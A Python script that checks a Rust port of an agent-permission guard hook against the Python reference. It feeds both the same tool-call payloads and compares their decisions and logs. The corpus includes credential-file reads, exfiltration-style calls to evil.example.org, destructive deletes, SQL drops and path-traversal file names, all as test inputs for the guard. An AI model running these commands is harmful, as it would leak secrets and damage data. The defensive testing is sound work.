#!/usr/bin/env python3
# SPDX-License-Identifier: MIT
"""Differential test of the guard: the same hook payloads go to the reference guard (Python, ORACLE_MAESTRO) and to the
Rust binary; exit code, stdout, stderr and the guard.log lines must be identical.

    python tools/guard_diff.py [--guard target/debug/guard.exe] [--filter text] [--verbose]

Requires ORACLE_MAESTRO (the read-only clone of the reference repository). Nothing in the reference is modified.
"""
import argparse
import json
import os
import shutil
import subprocess
import sys
import tempfile

ORACLE = os.environ.get("ORACLE_MAESTRO", os.path.join(os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__)))), "claude-maestro-legacy"))
PY_GUARD = os.path.join(ORACLE, "plugin", "skills", "orchestrator", "hooks", "guard.py")
HERE = os.path.dirname(os.path.abspath(__file__))
DEFAULT_RUST = os.path.join(os.path.dirname(HERE), "target", "debug", "guard.exe")

PROFILES = ["executor", "verifier", "spec", "orchestrator", "planning", "roadmapmap", "subprojects", "systemmap"]


def long_dir(path):
    return os.path.realpath(path)


class Sandbox:
    """A throw-away project with .git, .specs, a home folder and a data folder, at ONE stable path so messages match."""

    def __init__(self, root, variant):
        self.variant = variant
        self.base = os.path.join(root, variant)
        self.project = os.path.join(self.base, "proj")
        self.home = os.path.join(self.base, "home")
        self.data = os.path.join(self.base, "data")
        self.specs = os.path.join(self.project, ".specs")
        self.loopj = os.path.join(self.specs, "project", "loop", "json")
        self.loopi = os.path.join(self.specs, "project", "loop", "internal")
        for p in (self.project, self.home, self.data, self.loopj, self.loopi, os.path.join(self.project, ".git"),
                  os.path.join(self.project, "src", "a"), os.path.join(self.project, "src", "b"), os.path.join(self.home, ".claude")):
            os.makedirs(p, exist_ok=True)
        with open(os.path.join(self.project, ".git", "HEAD"), "w") as handle:
            handle.write("ref: refs/heads/feature/x\n")
        self.write_variant()

    def write_json(self, folder, name, data):
        with open(os.path.join(folder, name), "w", encoding="utf-8") as handle:
            json.dump(data, handle)

    def write_variant(self):
        v = self.variant
        env_local = os.path.join(self.project, ".env.local")
        if v == "scoped":
            self.write_json(self.loopj, "SCOPE.json", {"roots": [self.project], "copied": [env_local],
                                                      "features": {"feat-a": ["src/a"], "feat-b": ["src/b"]},
                                                      "tasks": {"feat-a/T1": ["src/a/t1.txt"]}})
        elif v == "broken":
            with open(os.path.join(self.loopj, "SCOPE.json"), "w") as handle:
                handle.write("{not json")
        elif v == "net":
            self.write_json(self.specs + os.sep + "project", "NETWORK.json", {"allow": ["api.example.com POST cred", "docs.example.com"]})
            with open(os.path.join(self.specs, "project", ".env.test"), "w") as handle:
                handle.write("API_URL=https://api.example.com\nAPI_TOKEN=secret-value\n")
            self.write_json(self.data, "config.json", {
                "mcp_servers": {"db-dev": {"allow": True, "kind": "sql"}, "db-prod": {"allow": True, "kind": "sql", "production": True},
                                "graf": {"allow": True, "read_only": True}, "off": {"allow": False}},
                "mcp_allow_extra": ["mcp__extra__*"]})
        elif v == "perm":
            self.write_json(self.loopj, "PERMISSIONS.json", {"allow": [{"rule": "git-write"}, "install", "dev-write"],
                                                            "deny_bash_regex": ["forbidden-tool", "(unclosed"], "deny_path_regex": ["\\.lock$"]})
        with open(os.path.join(self.project, ".env.local"), "w") as handle:
            handle.write("X=1\n")

    def env(self, extra):
        env = {k: v for k, v in os.environ.items() if not k.startswith(("LOOP_", "GUARD_"))}
        env.update({"USERPROFILE": self.home, "HOME": self.home, "LOOP_DATA_DIR": self.data, "PYTHONIOENCODING": "utf-8",
                    "COMPUTERNAME": "BOX1", "TEMP": os.path.join(self.base, "tmp"), "TMP": os.path.join(self.base, "tmp")})
        os.makedirs(env["TEMP"], exist_ok=True)
        env.update(extra or {})
        return env

    def reset(self):
        for name in ("guard.log", ".guard-alert"):
            for folder in (self.loopi, os.path.join(self.specs, "project")):
                try:
                    os.remove(os.path.join(folder, name))
                except OSError:
                    pass

    def log_lines(self):
        path = os.path.join(self.loopi, "guard.log")
        lines = []
        try:
            with open(path, encoding="utf-8") as handle:
                for raw in handle:
                    item = json.loads(raw)
                    item.pop("t", None)
                    lines.append(item)
        except OSError:
            pass
        return lines


def run_guard(command, sandbox, payload, profile, env_extra):
    started = subprocess.run(command + ["--profile", profile], input=json.dumps(payload), capture_output=True, text=True, encoding="utf-8",
                             errors="replace", env=sandbox.env(env_extra), cwd=sandbox.project, timeout=120)
    return started.returncode, started.stdout, started.stderr


def corpus(sb):
    """Cases as (variant, profile, env, payload, tag)."""
    p = sb["scoped"].project
    cases = []

    def add(variant, profile, tool, tool_input, env=None, extra=None, tag=""):
        payload = {"tool_name": tool, "tool_input": tool_input, "cwd": sb[variant].project}
        payload.update(extra or {})
        cases.append((variant, profile, env or {}, payload, tag or "%s %s" % (tool, json.dumps(tool_input)[:70])))

    bash = [
        "ls -la", "git status", "git log --oneline -3", "git commit -m x", "git add -A", "git add .", "git add file.txt", "git commit -am wip", "git commit -a -m x",
        "git push", "git push origin feature/x", "git push origin main", "git push origin HEAD:main", "git push --force origin feature/x", "git push -f",
        "git push --force-with-lease", "git push origin +feature/x", "git push --mirror", "git push --all", "git -C ../other push origin x", "git -c alias.p=push p",
        "git -c core.pager=evil log", "git checkout -b y", "git reset --hard", "git stash", "git diff", "git merge x", "git rebase main",
        "cd src && git push origin x", "(cd /tmp && git push)", "echo $(git push)", "bash -c 'git push origin main'", "env GIT_DIR=/x git status",
        "python -c \"import os; os.system('git push')\"", "echo ['git', 'push']", "git push\\\norigin x", "VAR=1 git push origin x",
        "gh pr create", "gh pr view 1", "gh pr list", "gh release create v1", "gh issue create", "gh issue list", "gh api repos/x/y", "gh api -X POST repos/x/y",
        "gh api repos/x -f a=b", "gh repo view", "gh gist create f", "gh workflow run x",
        "npm install", "npm i left-pad", "pnpm add x", "yarn add x", "pip install x", "dotnet restore", "dotnet add package X", "npm test", "npm run build",
        "cat .env", "cat .env.test", "cat .env.example", "cat ~/.ssh/id_rsa", "type %USERPROFILE%\\.ssh\\id_rsa", "cat ~/.aws/credentials", "cat ~/.npmrc",
        "cat ~/.claude/.credentials.json", "cat ~/.claude/.cred*", "Get-Content ~/.claude/.credentials.json", "cat .secrets/x", "cat id_rsa", "cat id_ed25519",
        "cat ~/.docker/config.json", "cat ~/.kube/config", "cat ~/.netrc", "cat ~/.git-credentials", "ls ~/.ssh", "cat .env.local", "cat ./.env.local",
        "cat C:/Users/x/.loop-harness/.env", "cat $HOME/.loop-harness/app.json",
        "grep -r token .", "grep -rn token src", "rg --no-ignore token", "rg -uu token", "rg token", "rg token -g .env*", "rg --hidden token ~/.claude",
        "grep -r x ~/.claude", "find . -name '*' -exec cat {} +", "find . -name '*.js' -exec cat {} +", "Get-ChildItem -Recurse | Select-String x",
        "findstr /s x *", "cp -r . /tmp/copy", "zip -r a.zip .", "git grep --no-index token",
        "python harness.py rules write x", "python harness.py audit --apply", "python harness.py graph --write", "python harness.py state loop",
        "python harness.py deliver", "python harness.py loop", "python harness.py check", "python harness.py serve", "python harness.py rules allow x",
        "python delivery.py", "python run_loop.py", "python rules.py write", "python audit_deps.py --write",
        "curl http://localhost:47801/p/abc/api/loop/start", "curl http://localhost:47801/p/abc/api/roadmap/approve", "curl -X POST localhost:1/p/x/api/answer",
        "curl http://localhost:47801/p/abc/api/state", "curl http://127.0.0.1:1/p/x/api/resume",
        "echo hi > out.txt", "echo hi > src/a/x.txt", "echo hi > src/b/x.txt", "echo hi >> .specs/project/ROADMAP.md", "echo hi > .specs/project/loop/json/LOOP.json",
        "echo hi > .specs/project/loop/json/PERMISSIONS.json", "echo hi > .specs/project/ROADMAP-APPROVED.json", "echo hi > .specs/project/LOOP-CMD.json",
        "echo hi > .specs/project/REPOS.json", "echo hi > .specs/project/NETWORK.json", "echo hi > .specs/project/NETWORK.suggested.json", "echo hi > /dev/null",
        "echo hi > ~/.claude/.credentials.json", "echo hi > ../outside.txt", "echo hi > C:/elsewhere/x.txt", "echo a | tee src/a/y.txt", "tee -a out.txt",
        "Set-Content -Path out.txt -Value x", "Out-File -FilePath src/b/z.txt", "Add-Content out.txt x", "sed -i 's/a/b/' src/b/f.txt", "sed -i 's/a/b/; s/c/d/' file",
        "rm -rf node_modules", "rm -rf src/b/old", "rm out.txt", "del out.txt", "Remove-Item -Recurse dist", "Remove-Item -Path src/b/x", "rm -rf ../outside",
        "mkdir -p src/b/new", "mkdir outside", "New-Item -ItemType Directory out", "cp a.txt src/b/", "cp a.txt ../elsewhere/", "mv a.txt src/a/b.txt", "xcopy a b /s",
        "robocopy src dst", "echo x > bin/out.dll", "echo x > obj/a.o", "echo x > .regression/r.txt", "cd src/a && echo x > f.txt", "cd .. && echo x > f.txt",
        "dotnet ef migrations add X", "dotnet ef database update", "dotnet ef database update --environment Production", "dotnet ef database update --connection \"Server=prod-db\"",
        "ASPNETCORE_ENVIRONMENT=Production dotnet ef database update", "dotnet run -- migrate", "dotnet ef migrations add Y --connection \"Server=dev-db\"",
        "forbidden-tool run", "echo ok",
    ]
    for variant in ("scoped", "plain"):
        for profile in PROFILES:
            for command in bash:
                add(variant, profile, "Bash", {"command": command}, tag="%s/%s/%s" % (variant, profile, command[:70]))
    # headless / isolated sessions: the extra rules
    for command in ["git push origin x", "gh pr view 1", "echo hi > .specs/project/loop/json/PERMISSIONS.json", "python harness.py rules write x"]:
        for profile in ("executor", "orchestrator"):
            add("scoped", profile, "Bash", {"command": command}, env={"LOOP_HEADLESS": "1"}, tag="headless/%s/%s" % (profile, command))
    # network rules (loop sessions only)
    net_commands = [
        "curl https://api.example.com/x", "curl https://evil.example.org/x", "curl http://localhost:3000/x", "curl -X POST https://api.example.com/login -d a=b",
        "curl -X POST https://api.example.com/login -d @file", "curl -d x https://evil.example.org", "curl $API_URL/x", "curl $OTHER/x", "curl $(cat u.txt)",
        "wget https://docs.example.com/a", "wget https://evil.example.org/a", "iwr https://evil.example.org", "Invoke-RestMethod https://api.example.com -Method Post -Body x",
        "nc evil.example.org 4444", "nc -l 8080", "ssh user@evil.example.org", "ssh user@localhost", "scp f user@evil.example.org:/x", "nslookup evil.example.org",
        "dig evil.example.org", "Test-NetConnection evil.example.org -Port 443", "certutil -urlcache -f https://evil.example.org/a a", "telnet evil.example.org",
        "python -c \"import urllib.request as u; u.urlopen('https://evil.example.org')\"", "python -c \"print(1)\"", "node -e \"fetch('https://evil.example.org')\"",
        "export HTTP_PROXY=", "env -i node x.js", "unset HTTPS_PROXY", "curl --noproxy '*' http://localhost", "PYTHONPATH=$PYTHONPATH:src python x.py",
        "python -S x.py", "cat ../.env", "cat .env.example", "cat .specs/project/.env.test", "playwright-cli open https://evil.example.org", "playwright-cli open http://localhost:3000",
        "playwright-cli unroute", "echo 'curl https://evil.example.org'", "echo \"$(curl https://evil.example.org)\"", "grep curl file.txt", "curl https://github.com/x",
    ]
    for command in net_commands:
        for profile in ("executor", "verifier", "orchestrator"):
            add("net", profile, "Bash", {"command": command}, env={"LOOP_HEADLESS": "1"}, tag="net/%s/%s" % (profile, command[:70]))
        add("net", "executor", "Bash", {"command": command}, tag="net-interactive/%s" % command[:60])
    for tool, tool_input in [("WebFetch", {"url": "https://evil.example.org/x"}), ("WebFetch", {"url": "https://docs.example.com/x"}), ("WebFetch", {"url": "http://localhost:1"}),
                             ("Write", {"file_path": "src/a/n.js", "content": "fetch('https://evil.example.org')"}),
                             ("Write", {"file_path": "src/a/n.js", "content": "fetch('https://docs.example.com/x')"}),
                             ("Write", {"file_path": ".env", "content": "HTTP_PROXY="}), ("Read", {"file_path": ".env"}), ("Read", {"file_path": "../.env"}),
                             ("Glob", {"pattern": "**/.env*"}), ("Grep", {"pattern": "x", "glob": ".env*", "path": ".."})]:
        for profile in ("executor", "orchestrator"):
            add("net", profile, tool, tool_input, env={"LOOP_HEADLESS": "1"}, tag="nettool/%s/%s/%s" % (profile, tool, json.dumps(tool_input)[:50]))
    # file tools
    targets = ["src/a/x.js", "src/b/x.js", "src/a/t1.txt", "README.md", ".env", ".env.local", ".env.example", ".specs/project/ROADMAP.md", ".specs/project/STATE.md",
               ".specs/features/f/spec.md", ".specs/project/loop/json/LOOP.json", ".specs/project/loop/json/SCOPE.json", ".specs/project/ROADMAP-APPROVED.json",
               ".specs/project/LOOP-CMD.json", ".specs/project/NETWORK.json", ".specs/project/NETWORK.suggested.json", ".specs/project/PROJECT.md",
               ".specs/project/SUBPROJECTS-SUGGESTED.json", "docs/codebase/SYSTEM.md", "docs/codebase/x.md", ".regression/r.txt", "../outside.txt",
               "C:/elsewhere/x.txt", "~/.ssh/id_rsa", "~/.claude/.credentials.json", "bin/x.dll", "src/a/.lock", "x.lock", "src\\a\\win.js", "SRC/A/UP.JS",
               "src/a/../b/trav.js", "\\\\?\\" + p + "\\src\\a\\pre.js", "/c/Users/someone/x", "src/a/file.js::$DATA", "src/a/file.js."]
    for variant in ("scoped", "plain", "broken", "perm"):
        for profile in PROFILES:
            for tool in ("Write", "Edit", "MultiEdit"):
                for target in targets:
                    add(variant, profile, tool, {"file_path": target, "content": "x", "old_string": "a", "new_string": "b"}, tag="%s/%s/%s/%s" % (variant, profile, tool, target[:60]))
    for variant in ("scoped", "plain"):
        for profile in ("executor", "orchestrator", "planning", "spec"):
            for tool_input in [{"file_path": ".env"}, {"file_path": ".env.local"}, {"file_path": "~/.ssh/id_rsa"}, {"file_path": "README.md"}, {"file_path": "src/a/x.js"},
                               {"file_path": "C:\\Users\\someone\\.claude\\.credentials.json"}]:
                add(variant, profile, "Read", tool_input, tag="%s/%s/Read/%s" % (variant, profile, tool_input["file_path"][:50]))
            for tool_input in [{"pattern": "x", "path": "~/.claude"}, {"pattern": "x", "path": "~/.claude", "glob": "*.json"}, {"pattern": "x", "glob": ".env*"},
                               {"pattern": "x", "glob": ".env*", "--no-ignore": True}, {"pattern": "x"}, {"pattern": "x", "type": "py", "path": "~/.claude"}]:
                add(variant, profile, "Grep", tool_input, tag="%s/%s/Grep/%s" % (variant, profile, json.dumps(tool_input)[:60]))
            for tool_input in [{"pattern": ".claude/.cred*", "path": "~"}, {"pattern": "**/*.json", "path": "~/.claude"}, {"pattern": ".env*"}, {"pattern": "src/**/*.js"}]:
                add(variant, profile, "Glob", tool_input, tag="%s/%s/Glob/%s" % (variant, profile, json.dumps(tool_input)[:60]))
    # agents, skills, MCP
    for profile in ("orchestrator", "executor"):
        for tool_input in [{"subagent_type": "spec-writer"}, {"subagent_type": "rolo-loop:executor-back", "model": "sonnet"}, {"subagent_type": "executor-back", "model": "opus"},
                           {"subagent_type": "general-purpose"}, {"subagent_type": "Explore"}, {}, {"subagent_type": "verifier", "model": "claude-haiku-4-5"}]:
            for tool in ("Agent", "Task"):
                add("plain", profile, tool, tool_input, tag="%s/%s/%s" % (profile, tool, json.dumps(tool_input)))
    mcp_tools = [("mcp__db-dev__query", {"query": "SELECT 1"}), ("mcp__db-dev__query", {"query": "DELETE FROM t"}), ("mcp__db-dev__query", {"query": "select 'a'; drop table t"}),
                 ("mcp__db-prod__query", {"query": "SELECT 1"}), ("mcp__db-prod__query", {"query": "UPDATE t SET a=1"}), ("mcp__graf__get_dashboard", {}), ("mcp__graf__create_dashboard", {}),
                 ("mcp__grafana__get_dashboard", {}), ("mcp__grafana__create_alert", {}), ("mcp__grafana__grafana_api_request", {"method": "POST"}), ("mcp__off__x", {}),
                 ("mcp__extra__anything", {}), ("mcp__unknown__x", {}), ("mcp__mysql__run", {"query": "insert into t values (1)"}), ("mcp__slack__send_message", {}),
                 ("mcp__jira__create_issue", {}), ("mcp__thing__update_prod_record", {}), ("mcp__db-dev__query", {"query": 5})]
    for env in ({}, {"LOOP_HEADLESS": "1"}):
        for profile in ("executor", "orchestrator", "planning", "spec"):
            for tool, tool_input in mcp_tools:
                add("net", profile, tool, tool_input, env=env, tag="mcp/%s/%s/%s/%s" % (bool(env), profile, tool, json.dumps(tool_input)[:40]))
    skills = os.path.join(sb["plain"].base, "skills.json")
    with open(skills, "w") as handle:
        json.dump({"executor": ["backend-dev", "github"], "orchestrator": ["orchestrator"]}, handle)
    for profile in ("executor", "orchestrator", "verifier"):
        for tool_input in [{"skill": "backend-dev"}, {"skill": "craft-dev-toolkit:github"}, {"skill": "tlc-spec-driven"}, {"command": "/orchestrator"}, {}]:
            add("plain", profile, "Skill", tool_input, env={"LOOP_SKILLS_FILE": skills}, tag="skill/%s/%s" % (profile, json.dumps(tool_input)))
            add("plain", profile, "Skill", tool_input, tag="skill-off/%s/%s" % (profile, json.dumps(tool_input)))
    # auto profile
    for agent in ("spec-writer", "executor-back", "verifier", "plugin:executor-front", "other-agent", "", "brownfield-mapper"):
        for command in ("git push origin x", "ls", "cat .env"):
            add("scoped", "auto", "Bash", {"command": command}, extra={"agent_type": agent} if agent else {}, tag="auto/%s/%s" % (agent, command))
            add("scoped", "auto", "Bash", {"command": command}, env={"LOOP_HEADLESS": "1"}, extra={"agent_type": agent} if agent else {}, tag="auto-headless/%s/%s" % (agent, command))
            add("scoped", "auto", "Bash", {"command": command}, env={"LOOP_ISOLATED": "1"}, extra={"agent_type": agent} if agent else {}, tag="auto-isolated/%s/%s" % (agent, command))
    # permissions release
    for command in ("git commit -m x", "npm install", "git push origin main", "echo ok", "forbidden-tool x", "echo x > a.lock"):
        for profile in ("executor", "orchestrator"):
            add("perm", profile, "Bash", {"command": command}, tag="perm/%s/%s" % (profile, command))
    return cases


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--guard", default=DEFAULT_RUST)
    parser.add_argument("--filter", default="")
    parser.add_argument("--verbose", action="store_true")
    parser.add_argument("--limit", type=int, default=0)
    args = parser.parse_args()
    if not os.path.isfile(PY_GUARD):
        print("ORACLE_MAESTRO does not point at the reference clone: %s" % PY_GUARD)
        return 2
    if not os.path.isfile(args.guard):
        print("build the Rust guard first: %s" % args.guard)
        return 2
    root = long_dir(tempfile.mkdtemp(prefix="guard-diff-", dir=os.environ.get("GUARD_DIFF_TMP") or None))
    try:
        sandboxes = {v: Sandbox(root, v) for v in ("scoped", "plain", "broken", "net", "perm")}
        cases = [c for c in corpus(sandboxes) if args.filter in c[4]]
        if args.limit:
            cases = cases[:args.limit]
        python = [sys.executable, PY_GUARD]
        rust = [args.guard]
        bad = 0
        for index, (variant, profile, env_extra, payload, tag) in enumerate(cases):
            sb = sandboxes[variant]
            sb.reset()
            py_result = run_guard(python, sb, payload, profile, env_extra)
            py_log = sb.log_lines()
            sb.reset()
            rs_result = run_guard(rust, sb, payload, profile, env_extra)
            rs_log = sb.log_lines()
            if py_result != rs_result or py_log != rs_log:
                bad += 1
                print("MISMATCH [%s] env=%s" % (tag, env_extra))
                if py_result[0] != rs_result[0]:
                    print("   exit: py=%s rust=%s" % (py_result[0], rs_result[0]))
                if py_result[1] != rs_result[1]:
                    print("   stdout py: %r\n   stdout rs: %r" % (py_result[1][:300], rs_result[1][:300]))
                if py_result[2] != rs_result[2]:
                    print("   stderr py: %r\n   stderr rs: %r" % (py_result[2][:400], rs_result[2][:400]))
                if py_log != rs_log:
                    print("   log py: %s\n   log rs: %s" % (json.dumps(py_log)[:400], json.dumps(rs_log)[:400]))
            elif args.verbose:
                print("ok   [%s]" % tag)
        print("%d cases, %d mismatches" % (len(cases), bad))
        return 1 if bad else 0
    finally:
        shutil.rmtree(root, ignore_errors=True)


if __name__ == "__main__":
    sys.exit(main())
